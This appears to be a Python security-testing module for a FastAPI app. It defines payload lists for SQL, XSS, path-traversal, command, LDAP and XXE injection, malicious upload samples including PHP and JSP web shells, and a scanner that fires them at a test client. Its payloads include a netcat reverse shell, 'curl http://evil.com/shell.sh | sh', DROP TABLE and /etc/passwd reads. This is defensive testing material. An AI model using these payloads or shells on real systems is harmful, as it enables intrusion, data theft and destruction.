"""
Enhanced Security Testing Utilities
Comprehensive tools for security testing, payload generation, and vulnerability scanning.
"""

import asyncio
import base64
import hashlib
import json
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Callable
from unittest.mock import MagicMock, patch
import urllib.parse

import pytest
from fastapi import status
from fastapi.testclient import TestClient
from sqlalchemy import text
from sqlalchemy.orm import Session

# Security severity levels
class SecuritySeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# Attack vector categories
class AttackVector(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    CSRF = "cross_site_request_forgery"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xml_external_entity"
    SSRF = "server_side_request_forgery"
    AUTH_BYPASS = "authentication_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    INSUFFICIENT_LOGGING = "insufficient_logging"
    RACE_CONDITION = "race_condition"
    BUSINESS_LOGIC = "business_logic_flaw"
    FILE_UPLOAD = "file_upload_vulnerability"
    RATE_LIMITING = "rate_limiting_bypass"
    SESSION_FIXATION = "session_fixation"


@dataclass
class SecurityTestResult:
    """Result of a security test."""
    test_name: str
    attack_vector: AttackVector
    severity: SecuritySeverity
    vulnerable: bool
    payload: str
    response: Optional[Any] = None
    details: str = ""
    mitigation: str = ""
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for reporting."""
        return {
            "test_name": self.test_name,
            "attack_vector": self.attack_vector.value,
            "severity": self.severity.value,
            "vulnerable": self.vulnerable,
            "payload": self.payload,
            "details": self.details,
            "mitigation": self.mitigation,
            "timestamp": self.timestamp
        }


class PayloadGenerator:
    """Generate various attack payloads for security testing."""
    
    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        # Basic injections
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        
        # Union-based injections
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT username, password FROM users--",
        
        # Time-based blind injections
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        
        # Boolean-based blind injections
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES (1,'admin','password')--",
        "'; UPDATE users SET password='hacked'--",
        
        # Advanced payloads
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND EXISTS(SELECT * FROM users)--",
        
        # NoSQL injection payloads
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "this.password == \'password\'"}',
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Event handler XSS
        "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<button onclick=alert('XSS')>Click</button>",
        
        # JavaScript protocol XSS
        "javascript:alert('XSS')",
        "javascript:alert(document.cookie)",
        "javascript:alert(document.domain)",
        
        # Data URI XSS
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        
        # DOM-based XSS
        "#<script>alert('XSS')</script>",
        "?name=<script>alert('XSS')</script>",
        
        # Encoded XSS
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        
        # Polyglot XSS
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        
        # Filter bypass XSS
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert`XSS`</script>",
        "<script>alert(/XSS/)</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        
        # CSS-based XSS
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<link rel=stylesheet href=javascript:alert('XSS')>",
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../",
        "../../",
        "../../../",
        "../../../../etc/passwd",
        "..\\",
        "..\\..\\",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",
        "..%5c",
        "%252e%252e%252f",
        "..%252f",
        "..%c0%af",
        "..%c1%9c",
        "file:///etc/passwd",
        "file://c:/windows/system32/config/sam",
    ]
    
    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "|| ls -la",
        "& ls -la",
        "&& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "; id",
        "| id",
        "; uname -a",
        "| uname -a",
        "; ping -c 10 127.0.0.1",
        "| ping -n 10 127.0.0.1",
        "; sleep 10",
        "| sleep 10",
        "\n/bin/ls -la",
        "\ncat /etc/passwd",
        "| nc -e /bin/sh 127.0.0.1 4444",
        "; curl http://evil.com/shell.sh | sh",
    ]
    
    # LDAP injection payloads
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(uid=*",
        "*)(objectClass=*",
        "admin*",
        "admin*)(|(objectClass=*",
        "*)(uid=*))(|(uid=*",
        "x' or name()='username' or 'x'='y",
        "admin*)(|(password=*))",
        "*)(|(password=*))",
        "*)(&(password=*))",
        "*)(|(objectclass=*))",
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    ]
    
    # CSRF tokens for testing
    CSRF_TOKENS = [
        "",  # Empty token
        "invalid_token",
        "' OR 1=1--",
        "<script>alert('XSS')</script>",
        "../../../etc/passwd",
    ]
    
    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "' OR '1'='1", "password": "password"},
        {"username": "admin'--", "password": ""},
        {"username": "admin", "password": {"$ne": None}},
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": "admin", "password": ""},
        {"username": "", "password": ""},
        {"username": None, "password": None},
    ]
    
    @classmethod
    def generate_sql_injection_payloads(cls, context: str = "") -> List[str]:
        """Generate SQL injection payloads with optional context."""
        payloads = cls.SQL_INJECTION_PAYLOADS.copy()
        if context:
            # Add context-specific payloads
            payloads.extend([
                f"{context}' OR '1'='1",
                f"{context}' UNION SELECT NULL--",
                f"{context}'; DROP TABLE users--",
            ])
        return payloads
    
    @classmethod
    def generate_xss_payloads(cls, context: str = "") -> List[str]:
        """Generate XSS payloads with optional context."""
        payloads = cls.XSS_PAYLOADS.copy()
        if context:
            # Add context-specific payloads
            payloads.extend([
                f"{context}<script>alert('XSS')</script>",
                f"{context}<img src=x onerror=alert('XSS')>",
            ])
        return payloads
    
    @classmethod
    def generate_fuzzing_inputs(cls, base_input: str = "", count: int = 100) -> List[str]:
        """Generate fuzzing inputs for boundary testing."""
        fuzz_inputs = []
        
        # Buffer overflow attempts
        for size in [100, 1000, 10000, 100000]:
            fuzz_inputs.append("A" * size)
            fuzz_inputs.append("%" * size)
            fuzz_inputs.append("\x00" * size)
        
        # Format string attacks
        fuzz_inputs.extend([
            "%s" * 100,
            "%x" * 100,
            "%n" * 10,
            "%d" * 100,
            "%.2147483647d",
        ])
        
        # Special characters
        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
        for char in special_chars:
            fuzz_inputs.append(char * 100)
        
        # Unicode and encoding tests
        fuzz_inputs.extend([
            "\u0000" * 100,
            "\uffff" * 100,
            "🔥" * 100,
            "\x00\x01\x02\x03" * 100,
        ])
        
        # Random inputs
        for _ in range(count):
            length = random.randint(1, 1000)
            fuzz_inputs.append(''.join(random.choices(string.printable, k=length)))
        
        if base_input:
            # Add variations of base input
            fuzz_inputs.extend([
                base_input * 100,
                base_input + "' OR '1'='1",
                base_input + "<script>alert('XSS')</script>",
                base_input + "../../../etc/passwd",
            ])
        
        return fuzz_inputs
    
    @classmethod
    def generate_malicious_files(cls) -> List[Tuple[str, bytes, str]]:
        """Generate malicious file uploads for testing.
        Returns: List of (filename, content, content_type) tuples
        """
        files = []
        
        # PHP webshell
        files.append((
            "shell.php",
            b"<?php system($_GET['cmd']); ?>",
            "application/x-php"
        ))
        
        # JSP webshell
        files.append((
            "shell.jsp",
            b"<%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "application/x-jsp"
        ))
        
        # Polyglot file (JPEG + JS)
        files.append((
            "image.jpg",
            b"\xff\xd8\xff\xe0<script>alert('XSS')</script>",
            "image/jpeg"
        ))
        
        # SVG with embedded JavaScript
        files.append((
            "image.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
            "image/svg+xml"
        ))
        
        # PDF with embedded JavaScript
        files.append((
            "document.pdf",
            b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>>>>>>/Contents 4 0 R>>endobj\n4 0 obj<</Length 44>>stream\nBT /F1 12 Tf 100 700 Td (JavaScript: app.alert('XSS')) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000260 00000 n\ntrailer<</Size 5/Root 1 0 R>>\nstartxref\n348\n%%EOF",
            "application/pdf"
        ))
        
        # Zip bomb (small version for testing)
        files.append((
            "bomb.zip",
            b"PK\x03\x04" + b"A" * 1000000,  # Simplified zip bomb
            "application/zip"
        ))
        
        # XML with XXE
        files.append((
            "xxe.xml",
            b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "application/xml"
        ))
        
        # HTML with stored XSS
        files.append((
            "xss.html",
            b"<html><body><script>alert('Stored XSS')</script></body></html>",
            "text/html"
        ))
        
        # Executable disguised as image
        files.append((
            "image.jpg.exe",
            b"MZ\x90\x00\x03",  # PE header
            "image/jpeg"
        ))
        
        # Path traversal filename
        files.append((
            "../../../etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash",
            "text/plain"
        ))
        
        return files


class SecurityScanner:
    """Automated security vulnerability scanner."""
    
    def __init__(self, client: TestClient, base_url: str = ""):
        self.client = client
        self.base_url = base_url
        self.results: List[SecurityTestResult] = []
        self.payload_generator = PayloadGenerator()
    
    async def scan_endpoint(self, 
                           method: str, 
                           endpoint: str, 
                           params: Optional[Dict] = None,
                           data: Optional[Dict] = None,
                           headers: Optional[Dict] = None) -> List[SecurityTestResult]:
        """Scan a single endpoint for vulnerabilities."""
        results = []
        
        # SQL Injection scan
        results.extend(await self._scan_sql_injection(method, endpoint, params, data, headers))
        
        # XSS scan
        results.extend(await self._scan_xss(method, endpoint, params, data, headers))
        
        # Path traversal scan
        results.extend(await self._scan_path_traversal(method, endpoint, params, data, headers))
        
        # Command injection scan
        results.extend(await self._scan_command_injection(method, endpoint, params, data, headers))
        
        # Authentication bypass scan
        results.extend(await self._scan_auth_bypass(method, endpoint, params, data, headers))
        
        self.results.extend(results)
        return results
    
    async def _scan_sql_injection(self, method: str, endpoint: str, 
                                 params: Optional[Dict], data: Optional[Dict], 
                                 headers: Optional[Dict]) -> List[SecurityTestResult]:
        """Scan for SQL injection vulnerabilities."""
        results = []
        payloads = self.payload_generator.generate_sql_injection_payloads()
        
        for payload in payloads:
            # Test in parameters
            if params:
                for key in params.keys():
                    test_params = params.copy()
                    test_params[key] = payload
                    result = await self._test_payload(
                        method, endpoint, test_params, data, headers,
                        payload, AttackVector.SQL_INJECTION
                    )
                    if result:
                        results.append(result)
            
            # Test in body data
            if data:
                for key in data.keys():
                    test_data = data.copy()
                    test_data[key] = payload
                    result = await self._test_payload(
                        method, endpoint, params, test_data, headers,
                        payload, AttackVector.SQL_INJECTION
                    )
                    if result:
                        results.append(result)
        
        return results
    
    async def _scan_xss(self, method: str, endpoint: str, 
                        params: Optional[Dict], data: Optional[Dict], 
                        headers: Optional[Dict]) -> List[SecurityTestResult]:
        """Scan for XSS vulnerabilities."""
        results = []
        payloads = self.payload_generator.generate_xss_payloads()
        
        for payload in payloads:
            # Test in parameters
            if params:
                for key in params.keys():
                    test_params = params.copy()
                    test_params[key] = payload
                    result = await self._test_payload(
                        method, endpoint, test_params, data, headers,
                        payload, AttackVector.XSS
                    )
                    if result:
                        results.append(result)
            
            # Test in body data
            if data:
                for key in data.keys():
                    test_data = data.copy()
                    test_data[key] = payload
                    result = await self._test_payload(
                        method, endpoint, params, test_data, headers,
                        payload, AttackVector.XSS
                    )
                    if result:
                        results.append(result)
        
        return results
    
    async def _scan_path_traversal(self, method: str, endpoint: str, 
                                   params: Optional[Dict], data: Optional[Dict], 
                                   headers: Optional[Dict]) -> List[SecurityTestResult]:
        """Scan for path traversal vulnerabilities."""
        results = []
        
        for payload in PayloadGenerator.PATH_TRAVERSAL_PAYLOADS:
            # Test in URL path
            test_endpoint = endpoint.replace("{id}", payload) if "{id}" in endpoint else endpoint
            if test_endpoint != endpoint:
                result = await self._test_payload(
                    method, test_endpoint, params, data, headers,
                    payload, AttackVector.PATH_TRAVERSAL
                )
                if result:
                    results.append(result)
            
            # Test in parameters
            if params:
                for key in params.keys():
                    test_params = params.copy()
                    test_params[key] = payload
                    result = await self._test_payload(
                        method, endpoint, test_params, data, headers,
                        payload, AttackVector.PATH_TRAVERSAL
                    )
                    if result:
                        results.append(result)
        
        return results
    
    async def _scan_command_injection(self, method: str, endpoint: str, 
                                     params: Optional[Dict], data: Optional[Dict], 
                                     headers: Optional[Dict]) -> List[SecurityTestResult]:
        """Scan for command injection vulnerabilities."""
        results = []
        
        for payload in PayloadGenerator.COMMAND_INJECTION_PAYLOADS:
            # Test in parameters
            if params:
                for key in params.keys():
                    test_params = params.copy()
                    test_params[key] = payload
                    result = await self._test_payload(
                        method, endpoint, test_params, data, headers,
                        payload, AttackVector.COMMAND_INJECTION
                    )
                    if result:
                        results.append(result)
            
            # Test in body data
            if data:
                for key in data.keys():
                    test_data = data.copy()
                    test_data[key] = payload
                    result = await self._test_payload(
                        method, endpoint, params, test_data, headers,
                        payload, AttackVector.COMMAND_INJECTION
                    )
                    if result:
                        results.append(result)
        
        return results
    
    async def _scan_auth_bypass(self, method: str, endpoint: str, 
                               params: Optional[Dict], data: Optional[Dict], 
                               headers: Optional[Dict]) -> List[SecurityTestResult]:
        """Scan for authentication bypass vulnerabilities."""
        results = []
        
        for payload in PayloadGenerator.AUTH_BYPASS_PAYLOADS:
            result = await self._test_payload(
                method, endpoint, params, payload, headers,
                str(payload), AttackVector.AUTH_BYPASS
            )
            if result:
                results.append(result)
        
        return results
    
    async def _test_payload(self, method: str, endpoint: str, 
                           params: Optional[Dict], data: Optional[Dict], 
                           headers: Optional[Dict], payload: str, 
                           attack_vector: AttackVector) -> Optional[SecurityTestResult]:
        """Test a single payload and analyze response."""
        try:
            # Make request based on method
            if method.upper() == "GET":
                response = self.client.get(endpoint, params=params, headers=headers)
            elif method.upper() == "POST":
                response = self.client.post(endpoint, params=params, json=data, headers=headers)
            elif method.upper() == "PUT":
                response = self.client.put(endpoint, params=params, json=data, headers=headers)
            elif method.upper() == "DELETE":
                response = self.client.delete(endpoint, params=params, headers=headers)
            else:
                return None
            
            # Analyze response for vulnerability indicators
            vulnerable = self._analyze_response(response, payload, attack_vector)
            
            if vulnerable:
                return SecurityTestResult(
                    test_name=f"{attack_vector.value}_{endpoint}",
                    attack_vector=attack_vector,
                    severity=self._determine_severity(attack_vector, response),
                    vulnerable=True,
                    payload=payload,
                    response=response,
                    details=f"Potential {attack_vector.value} vulnerability detected",
                    mitigation=self._get_mitigation(attack_vector)
                )
        except Exception as e:
            # Error might indicate vulnerability
            return SecurityTestResult(
                test_name=f"{attack_vector.value}_{endpoint}",
                attack_vector=attack_vector,
                severity=SecuritySeverity.MEDIUM,
                vulnerable=True,
                payload=payload,
                details=f"Error during testing: {str(e)}",
                mitigation=self._get_mitigation(attack_vector)
            )
        
        return None
    
    def _analyze_response(self, response: Any, payload: str, attack_vector: AttackVector) -> bool:
        """Analyze response for vulnerability indicators."""
        if not response:
            return False
        
        response_text = str(response.text) if hasattr(response, 'text') else str(response)
        response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
        
        # SQL Injection indicators
        if attack_vector == AttackVector.SQL_INJECTION:
            sql_errors = [
                "SQL syntax", "mysql_fetch", "Warning: mysql", "MySQLSyntaxErrorException",
                "PostgreSQL", "pg_query", "pg_exec", "PG::SyntaxError",
                "SQLiteException", "sqlite3.OperationalError", "SQLITE_ERROR",
                "ORA-01756", "Oracle error", "Oracle driver",
                "Microsoft SQL Server", "SqlException", "[Microsoft][ODBC SQL Server Driver]",
                "DB2 SQL error", "db2_execute", "DB2Exception"
            ]
            for error in sql_errors:
                if error.lower() in response_text.lower():
                    return True
            
            # Check for successful injection (e.g., returning all records)
            if response.status_code == 200 and "admin" in response_text.lower():
                return True
        
        # XSS indicators
        elif attack_vector == AttackVector.XSS:
            # Check if payload is reflected without encoding
            if payload in response_text:
                return True
            # Check for unencoded script tags
            if "<script>" in response_text and "alert" in response_text:
                return True
            # Check response headers for missing security headers
            if 'X-XSS-Protection' not in response_headers:
                return True
            if 'Content-Security-Policy' not in response_headers:
                return True
        
        # Path traversal indicators
        elif attack_vector == AttackVector.PATH_TRAVERSAL:
            path_indicators = [
                "root:x:", "/etc/passwd", "boot.ini", "[boot loader]",
                "Windows", "Program Files", "System32",
                "../", "..\\", "Directory listing"
            ]
            for indicator in path_indicators:
                if indicator in response_text:
                    return True
        
        # Command injection indicators
        elif attack_vector == AttackVector.COMMAND_INJECTION:
            cmd_indicators = [
                "uid=", "gid=", "groups=",  # Unix id command
                "Linux", "Darwin", "Windows",  # uname output
                "root", "daemon", "bin",  # Common users
                "total", "drwxr", "-rw-r",  # ls output
                "inet", "inet6", "127.0.0.1",  # Network info
            ]
            for indicator in cmd_indicators:
                if indicator in response_text:
                    return True
        
        # Authentication bypass indicators
        elif attack_vector == AttackVector.AUTH_BYPASS:
            if response.status_code in [200, 201, 204]:
                # Check if we got admin/privileged access
                if any(word in response_text.lower() for word in ["admin", "dashboard", "success", "welcome"]):
                    return True
        
        # Generic error indicators
        if response.status_code >= 500:
            return True
        
        return False
    
    def _determine_severity(self, attack_vector: AttackVector, response: Any) -> SecuritySeverity:
        """Determine severity of detected vulnerability."""
        critical_vectors = [
            AttackVector.SQL_INJECTION,
            AttackVector.COMMAND_INJECTION,
            AttackVector.AUTH_BYPASS,
            AttackVector.INSECURE_DESERIALIZATION
        ]
        
        high_vectors = [
            AttackVector.XSS,
            AttackVector.XXE,
            AttackVector.SSRF,
            AttackVector.PATH_TRAVERSAL
        ]
        
        if attack_vector in critical_vectors:
            return SecuritySeverity.CRITICAL
        elif attack_vector in high_vectors:
            return SecuritySeverity.HIGH
        elif response and response.status_code >= 500:
            return SecuritySeverity.HIGH
        else:
            return SecuritySeverity.MEDIUM
    
    def _get_mitigation(self, attack_vector: AttackVector) -> str:
        """Get mitigation recommendations for vulnerability."""
        mitigations = {
            AttackVector.SQL_INJECTION: "Use parameterized queries, input validation, and prepared statements",
            AttackVector.XSS: "Implement output encoding, Content Security Policy, and input sanitization",
            AttackVector.CSRF: "Use CSRF tokens, SameSite cookies, and verify referrer headers",
            AttackVector.PATH_TRAVERSAL: "Validate and sanitize file paths, use whitelisting",
            AttackVector.COMMAND_INJECTION: "Avoid system calls, use parameterized commands, input validation",
            AttackVector.AUTH_BYPASS: "Implement proper authentication, use secure session management",
            AttackVector.FILE_UPLOAD: "Validate file types, scan for malware, store outside webroot",
            AttackVector.RATE_LIMITING: "Implement rate limiting, use CAPTCHA, monitor for abuse",
        }
        return mitigations.get(attack_vector, "Implement proper input validation and security controls")
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate security scan report."""
        if not self.results:
            return {"status": "no_vulnerabilities", "results": []}
        
        vulnerable_count = sum(1 for r in self.results if r.vulnerable)
        severity_counts = {}
        for severity in SecuritySeverity:
            severity_counts[severity.value] = sum(
                1 for r in self.results 
                if r.vulnerable and r.severity == severity
            )
        
        return {
            "total_tests": len(self.results),
            "vulnerabilities_found": vulnerable_count,
            "severity_breakdown": severity_counts,
            "results": [r.to_dict() for r in self.results if r.vulnerable],
            "scan_timestamp": time.time()
        }


class SecurityTestFixtures:
    """Common fixtures for security testing."""
    
    @staticmethod
    def create_mock_user(user_id: int = 1, username: str = "testuser", 
                        role: str = "user") -> Dict[str, Any]:
        """Create a mock user for testing."""
        return {
            "id": user_id,
            "username": username,
            "email": f"{username}@test.com",
            "role": role,
            "is_active": True,
            "created_at": time.time()
        }
    
    @staticmethod
    def create_mock_session(user_id: int = 1, session_id: str = None) -> Dict[str, Any]:
        """Create a mock session for testing."""
        if not session_id:
            session_id = hashlib.sha256(f"session_{user_id}_{time.time()}".encode()).hexdigest()
        
        return {
            "session_id": session_id,
            "user_id": user_id,
            "created_at": time.time(),
            "expires_at": time.time() + 3600,
            "ip_address": "127.0.0.1",
            "user_agent": "SecurityTestClient/1.0"
        }
    
    @staticmethod
    def create_malicious_pdf() -> bytes:
        """Create a malicious PDF for testing."""
        # Simplified malicious PDF with JavaScript
        return b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
  /S /JavaScript
  /JS (app.alert({cMsg: "XSS", cTitle: "XSS Test"});)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000157 00000 n
0000000214 00000 n
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
294
%%EOF"""
    
    @staticmethod
    def create_test_database() -> Session:
        """Create a test database session."""
        from sqlalchemy import create_engine
        from sqlalchemy.orm import sessionmaker
        
        engine = create_engine("sqlite:///:memory:")
        SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
        return SessionLocal()


class SecurityMonitor:
    """Monitor and track security events during testing."""
    
    def __init__(self):
        self.events: List[Dict[str, Any]] = []
        self.alerts: List[Dict[str, Any]] = []
        
    def log_event(self, event_type: str, details: Dict[str, Any]):
        """Log a security event."""
        event = {
            "timestamp": time.time(),
            "type": event_type,
            "details": details
        }
        self.events.append(event)
        
        # Check if event should trigger an alert
        if self._should_alert(event_type, details):
            self.create_alert(event_type, details)
    
    def create_alert(self, alert_type: str, details: Dict[str, Any]):
        """Create a security alert."""
        alert = {
            "timestamp": time.time(),
            "type": alert_type,
            "severity": self._determine_alert_severity(alert_type),
            "details": details
        }
        self.alerts.append(alert)
    
    def _should_alert(self, event_type: str, details: Dict[str, Any]) -> bool:
        """Determine if an event should trigger an alert."""
        alert_triggers = [
            "sql_injection_attempt",
            "xss_attempt",
            "authentication_failure",
            "privilege_escalation_attempt",
            "rate_limit_exceeded",
            "malicious_file_upload"
        ]
        return event_type in alert_triggers
    
    def _determine_alert_severity(self, alert_type: str) -> str:
        """Determine alert severity."""
        critical_alerts = ["sql_injection_attempt", "privilege_escalation_attempt"]
        high_alerts = ["xss_attempt", "authentication_failure", "malicious_file_upload"]
        
        if alert_type in critical_alerts:
            return "critical"
        elif alert_type in high_alerts:
            return "high"
        else:
            return "medium"
    
    def get_summary(self) -> Dict[str, Any]:
        """Get summary of security events and alerts."""
        return {
            "total_events": len(self.events),
            "total_alerts": len(self.alerts),
            "critical_alerts": sum(1 for a in self.alerts if a["severity"] == "critical"),
            "high_alerts": sum(1 for a in self.alerts if a["severity"] == "high"),
            "recent_events": self.events[-10:] if self.events else [],
            "recent_alerts": self.alerts[-5:] if self.alerts else []
        }


# Async security testing utilities
class AsyncSecurityTester:
    """Async utilities for concurrent security testing."""
    
    @staticmethod
    async def concurrent_attack(client: TestClient, endpoint: str, 
                               payloads: List[str], concurrency: int = 10) -> List[Any]:
        """Execute concurrent attacks for race condition testing."""
        import aiohttp
        import asyncio
        
        async def attack_with_payload(session: aiohttp.ClientSession, payload: str):
            try:
                async with session.post(endpoint, json={"data": payload}) as response:
                    return await response.json()
            except Exception as e:
                return {"error": str(e)}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for payload in payloads[:concurrency]:
                tasks.append(attack_with_payload(session, payload))
            
            results = await asyncio.gather(*tasks)
            return results
    
    @staticmethod
    async def timing_attack(client: TestClient, endpoint: str, 
                           payloads: List[str]) -> Dict[str, float]:
        """Perform timing attack analysis."""
        timings = {}
        
        for payload in payloads:
            start_time = time.time()
            try:
                response = client.post(endpoint, json={"data": payload})
                elapsed = time.time() - start_time
                timings[payload] = elapsed
            except:
                timings[payload] = -1
        
        return timings


# Export all utilities
__all__ = [
    'SecuritySeverity',
    'AttackVector',
    'SecurityTestResult',
    'PayloadGenerator',
    'SecurityScanner',
    'SecurityTestFixtures',
    'SecurityMonitor',
    'AsyncSecurityTester'
]